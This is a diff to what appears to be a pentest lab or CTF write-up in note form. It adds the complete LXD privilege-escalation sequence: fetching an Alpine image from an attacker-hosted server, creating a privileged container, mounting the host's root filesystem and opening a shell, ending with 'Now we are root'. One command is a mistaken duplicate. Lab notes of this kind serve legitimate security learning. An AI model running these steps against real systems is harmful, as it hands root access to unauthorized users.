@@ -1911,5 +1911,42 @@ python -m http.server 3030
 wget http://192.168.132.222:3030/lxd-alpine-builder/alpine-v3.23-x86_64-20260225_2113.tar.gz
 ```
 
+```
+lxc image import alpine-v3.23-x86_64-20260225_2113.tar.gz --alias alpine
+```
+
+```
+lxc import image alpine-v3.23-x86_64-20260225_2113.tar.gz --alias alpine
+```
+
+```
+lxc init alpine privesc -c security.privileged=true
+```
+
+![[Pasted image 20260227170700.png]]
+
+```
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+
+```
+lxc start privesc
+```
+
+```
+lxc exec privesc /bin/sh
+```
+
+![[Pasted image 20260227171056.png]]
+
+Now we are root
+
+
+
+
+
+
+
+
 
 
